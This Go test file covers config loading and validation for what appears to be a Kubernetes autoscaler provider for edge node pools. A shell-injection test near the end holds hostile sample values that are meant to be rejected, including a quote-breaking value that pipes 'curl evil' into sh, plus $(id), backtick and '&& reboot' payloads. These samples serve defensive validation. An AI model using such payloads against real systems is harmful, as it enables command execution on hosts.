package main

import (
	"os"
	"testing"
)

func setEnv(t *testing.T, kv map[string]string) {
	t.Helper()
	for k, v := range kv {
		old, had := os.LookupEnv(k)
		os.Setenv(k, v)
		t.Cleanup(func() {
			if had {
				os.Setenv(k, old)
			} else {
				os.Unsetenv(k)
			}
		})
	}
}

const groupsJSON = `[
  {"id":"np-a","nodepool_id":"np-a","name_prefix":"edge-web","min":6,"max":12,
   "instance_type":"ens.sn1.small","labels":{"product":"web"},
   "taints":[{"key":"product","value":"web","effect":"NoSchedule"}],
   "security_group_id":"sg-web","public_ip":false},
  {"id":"np-b","name_prefix":"edge-system","min":3,"max":5,
   "labels":{"tier":"system"},"taints":[]}
]`

func loadTestConfig(t *testing.T) *Config {
	t.Helper()
	setEnv(t, map[string]string{
		"ENS_REGION": "ens-region-1", "CLUSTER_ID": "c-test",
		"NETWORK_ID": "n-x", "VSWITCH_ID": "vsw-x", "SECURITY_GROUP_ID": "sg-default",
		"NODE_GROUPS": groupsJSON,
	})
	cfg, err := LoadConfig()
	if err != nil {
		t.Fatalf("LoadConfig: %v", err)
	}
	return cfg
}

func TestLoadConfigDefaultsAndOverrides(t *testing.T) {
	cfg := loadTestConfig(t)
	if len(cfg.Groups) != 2 {
		t.Fatalf("want 2 groups, got %d", len(cfg.Groups))
	}
	a := cfg.GroupByID("np-a")
	if a.SecurityGroupID != "sg-web" {
		t.Errorf("per-group SG not honored: %s", a.SecurityGroupID)
	}
	if *a.PublicIP {
		t.Errorf("public_ip=false not honored")
	}
	b := cfg.GroupByID("np-b")
	if b.SecurityGroupID != "sg-default" {
		t.Errorf("SG default not inherited: %s", b.SecurityGroupID)
	}
	if b.NodepoolID != "np-b" {
		t.Errorf("nodepool_id should default to id")
	}
	if *b.PublicIP { // default is private
		t.Errorf("default public_ip should be false")
	}
	if len(b.Taints) != 0 {
		t.Errorf("empty taints must be honored as-is (untainted system pool)")
	}
}

func TestPrefixGuard(t *testing.T) {
	setEnv(t, map[string]string{
		"ENS_REGION": "r", "CLUSTER_ID": "c",
		"NODE_GROUPS": `[{"id":"a","name_prefix":"edge"},{"id":"b","name_prefix":"edge-web"}]`,
	})
	if _, err := LoadConfig(); err == nil {
		t.Fatalf("aliasing prefixes must be rejected")
	}
}

func TestProviderIDRoundTrip(t *testing.T) {
	cfg := loadTestConfig(t)
	pid := cfg.ProviderID("i-abc123")
	if pid != "ens-region-1.i-abc123" {
		t.Fatalf("providerID format: %s", pid)
	}
	if InstanceIDFromProviderID(pid) != "i-abc123" {
		t.Fatalf("round trip failed")
	}
	if InstanceIDFromProviderID("") != "" {
		t.Fatalf("empty pid must yield empty id")
	}
}

func TestStrictEdgeInstanceID(t *testing.T) {
	cfg := loadTestConfig(t)
	for input, want := range map[string]string{
		"ens-region-1.i-abc123":                    "i-abc123",
		"ens-region-1.i-0123456789abcdefghijklmn": "i-0123456789abcdefghijklmn",
	} {
		if got := cfg.StrictEdgeInstanceID(input); got != want {
			t.Errorf("StrictEdgeInstanceID(%q) = %q, want %q", input, got, want)
		}
	}
	for _, input := range []string{
		"", "garbage", "ens-region-1.", "ens-region-1.i-",
		"cn-hangzhou.i-abc123", "ap-southeast-1.i-abc123",
		"ens-region-1.not-an-instance", "ens-region-1.i-ABC",
		"ens-region-1.i-abc.def", "ens-region-1.i-abc/def",
		"ens-region-1.i-abc def", "ens-region-1.i-abc\tdef",
		"ens-region-1.i-abc\ndef", "ens-region-1.i-abc?def",
	} {
		if got := cfg.StrictEdgeInstanceID(input); got != "" {
			t.Errorf("StrictEdgeInstanceID(%q) = %q, want refusal", input, got)
		}
	}
}

func TestGroupForInstanceName(t *testing.T) {
	cfg := loadTestConfig(t)
	for name, want := range map[string]string{
		"edge-web":                         "np-a",
		"edge-web-opabcd-1700000000":       "np-a",
		"edge-system-opabcd-1700000000": "np-b",
	} {
		owner := cfg.GroupForInstanceName(name)
		if owner == nil || owner.ID != want {
			t.Errorf("GroupForInstanceName(%q) = %#v, want %s", name, owner, want)
		}
	}
	for _, name := range []string{"", "uat-web-node", "edge-camera-node", "web-edge"} {
		if owner := cfg.GroupForInstanceName(name); owner != nil {
			t.Errorf("GroupForInstanceName(%q) = %s, want nil", name, owner.ID)
		}
	}
}

func TestGroupForNodeLabels(t *testing.T) {
	cfg := loadTestConfig(t)
	if g := cfg.GroupForNodeLabels(map[string]string{NodepoolLabel: "np-a"}); g == nil || g.ID != "np-a" {
		t.Fatalf("nodepool label mapping failed")
	}
	if g := cfg.GroupForNodeLabels(map[string]string{"foo": "bar"}); g != nil {
		t.Fatalf("cloud node must map to no group")
	}
}

func TestTemplateNode(t *testing.T) {
	cfg := loadTestConfig(t)
	g := cfg.GroupByID("np-a")
	n := BuildTemplateNode(cfg, g)
	if n.Labels["product"] != "web" || n.Labels[NodepoolLabel] != "np-a" {
		t.Errorf("template labels wrong: %v", n.Labels)
	}
	if len(n.Spec.Taints) != 1 || n.Spec.Taints[0].Key != "product" {
		t.Errorf("template taints wrong: %v", n.Spec.Taints)
	}
	if n.Status.Capacity.Cpu().String() != "4" {
		t.Errorf("capacity cpu: %s", n.Status.Capacity.Cpu().String())
	}
	// untainted pool: template MUST stay untainted
	b := cfg.GroupByID("np-b")
	if nb := BuildTemplateNode(cfg, b); len(nb.Spec.Taints) != 0 {
		t.Errorf("untainted pool grew taints: %v", nb.Spec.Taints)
	}
}

// ---- v0.1.5 startup-validation tests (design plan) ----

func expectLoadError(t *testing.T, groupsJSON, wantSubstr string) {
	t.Helper()
	setEnv(t, map[string]string{
		"ENS_REGION": "r", "CLUSTER_ID": "c",
		"NETWORK_ID": "n-x", "VSWITCH_ID": "vsw-x", "SECURITY_GROUP_ID": "sg-x",
		"NODE_GROUPS": groupsJSON,
	})
	_, err := LoadConfig()
	if err == nil {
		t.Fatalf("expected error containing %q, got nil", wantSubstr)
	}
	if wantSubstr != "" && !contains(err.Error(), wantSubstr) {
		t.Fatalf("error %q does not contain %q", err.Error(), wantSubstr)
	}
}

func contains(s, sub string) bool {
	return len(sub) == 0 || (len(s) >= len(sub) && (s == sub || len(s) > 0 && (func() bool { return stringsIndex(s, sub) >= 0 })()))
}
func stringsIndex(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func TestValidateEqualPrefixesRejected(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x"},{"id":"b","name_prefix":"edge-x"}]`,
		"share name_prefix")
}

func TestValidateDuplicateIDRejected(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x"},{"id":"a","name_prefix":"edge-y"}]`,
		"duplicate group id")
}

func TestValidateDuplicateNodepoolRejected(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","nodepool_id":"np1","name_prefix":"edge-x"},{"id":"b","nodepool_id":"np1","name_prefix":"edge-y"}]`,
		"duplicate nodepool_id")
}

func TestValidateMinMax(t *testing.T) {
	expectLoadError(t, `[{"id":"a","name_prefix":"edge-x","min":-1}]`, "min -1 < 0")
	expectLoadError(t, `[{"id":"a","name_prefix":"edge-x","min":5,"max":2}]`, "max 2 < min 5")
}

func TestValidateTaintEffect(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","taints":[{"key":"k","value":"v","effect":"Nope"}]}]`,
		"invalid effect")
}

func TestValidateBadTemplateQuantity(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","template":{"cpu":"two"}}]`,
		"does not parse")
}

func TestValidateAllocExceedsCapacity(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","template":{"cpu":"2","cpu_alloc":"3"}}]`,
		"cpu_alloc")
}

func TestValidateTemplateRequiredForNonDefaultType(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","instance_type":"ens.sn1.tiny"}]`,
		"has no template")
}

// ---- P0-1 (2026-08 review): shell-injection gate on node-spec inputs ----
// Labels, taints and nodepool_id land single-quoted inside the join script;
// json.Marshal does NOT escape ', so anything outside k8s label syntax must
// die at LoadConfig, never reach a node's shell.

func TestValidateShellUnsafeLabelValueRejected(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","labels":{"team":"o'reilly"}}]`,
		`label "team" value`)
}

func TestValidateShellUnsafeLabelKeyRejected(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","labels":{"te'am":"web"}}]`,
		"label key")
}

func TestValidateShellUnsafeTaintRejected(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","taints":[{"key":"k'ey","value":"v","effect":"NoSchedule"}]}]`,
		"taint key")
	expectLoadError(t,
		`[{"id":"a","name_prefix":"edge-x","taints":[{"key":"k","value":"v'al){ :; }","effect":"NoSchedule"}]}]`,
		`taint "k" value`)
}

func TestValidateShellUnsafeNodepoolIDRejected(t *testing.T) {
	expectLoadError(t,
		`[{"id":"a","nodepool_id":"np'x","name_prefix":"edge-x"}]`,
		"nodepool_id")
}

// C-01 : CONTROL_REGION / K8S_VERSION / RUNTIME_VERSION reach the
// same join-script sink — quotes and command syntax must die at LoadConfig.
func TestValidateShellUnsafeScriptEnvRejected(t *testing.T) {
	base := map[string]string{
		"ENS_REGION": "r", "CLUSTER_ID": "c",
		"NETWORK_ID": "n-x", "VSWITCH_ID": "vsw-x", "SECURITY_GROUP_ID": "sg-x",
		"NODE_GROUPS": `[{"id":"a","name_prefix":"edge-x"}]`,
	}
	cases := []struct{ key, bad, wantSubstr string }{
		{"CONTROL_REGION", "ap-southeast-1'; curl evil | sh #", "CONTROL_REGION"},
		{"CONTROL_REGION", "ap-southeast-1$(id)", "CONTROL_REGION"},
		{"K8S_VERSION", "1.32.1'-aliyun", "K8S_VERSION"},
		{"K8S_VERSION", "1.32.1 && reboot", "K8S_VERSION"},
		{"RUNTIME_VERSION", "1.6.39'", "RUNTIME_VERSION"},
		{"RUNTIME_VERSION", "1.6.39`id`", "RUNTIME_VERSION"},
	}
	for _, tc := range cases {
		// subtest so each case's env teardown runs BEFORE the next case —
		// t.Setenv cleanups fire at (sub)test end, not per loop iteration
		t.Run(tc.key, func(t *testing.T) {
			setEnv(t, base)
			t.Setenv(tc.key, tc.bad)
			_, err := LoadConfig()
			if err == nil {
				t.Fatalf("%s=%q must be rejected", tc.key, tc.bad)
			}
			if !contains(err.Error(), tc.wantSubstr) {
				t.Fatalf("%s=%q: error %q does not name the offending key", tc.key, tc.bad, err.Error())
			}
		})
	}
}

// ...and the LIVE values (plus the built-in defaults) must keep loading.
func TestValidateScriptEnvLiveValuesAccepted(t *testing.T) {
	setEnv(t, map[string]string{
		"ENS_REGION": "ens-region-1", "CLUSTER_ID": "c-test",
		"NETWORK_ID": "n-x", "VSWITCH_ID": "vsw-x", "SECURITY_GROUP_ID": "sg-x",
		"NODE_GROUPS":     `[{"id":"a","name_prefix":"edge-x"}]`,
		"CONTROL_REGION":  "ap-southeast-1",
		"K8S_VERSION":     "1.32.1-aliyun.1",
		"RUNTIME_VERSION": "1.6.39",
	})
	if _, err := LoadConfig(); err != nil {
		t.Fatalf("live region/version identifiers must load: %v", err)
	}
}

// The gate must not over-reject: real label shapes (prefixed keys, empty
// values, dots/dashes/underscores) are all legal k8s syntax and must load.
func TestValidateLabelSyntaxAccepted(t *testing.T) {
	setEnv(t, map[string]string{
		"ENS_REGION": "r", "CLUSTER_ID": "c",
		"NETWORK_ID": "n-x", "VSWITCH_ID": "vsw-x", "SECURITY_GROUP_ID": "sg-x",
		"NODE_GROUPS": `[{"id":"a","name_prefix":"edge-x",
		  "labels":{"example.com/tier":"backend-v1.2","flag":""},
		  "taints":[{"key":"apps.openyurt.io/taint_x","value":"","effect":"NoExecute"}]}]`,
	})
	if _, err := LoadConfig(); err != nil {
		t.Fatalf("legal k8s label/taint syntax must load: %v", err)
	}
}

func TestValidateNonDefaultTypeWithTemplateOK(t *testing.T) {
	setEnv(t, map[string]string{
		"ENS_REGION": "r", "CLUSTER_ID": "c",
		"NETWORK_ID": "n-x", "VSWITCH_ID": "vsw-x", "SECURITY_GROUP_ID": "sg-x",
		"NODE_GROUPS": `[{"id":"a","name_prefix":"edge-x","instance_type":"ens.sn1.tiny",
		  "template":{"cpu":"2","memory":"3816092Ki","pods":"64","ephemeral":"46095032Ki",
		              "cpu_alloc":"1930m","mem_alloc":"3248796Ki"}}]`,
	})
	if _, err := LoadConfig(); err != nil {
		t.Fatalf("tiny group with measured template must load: %v", err)
	}
}
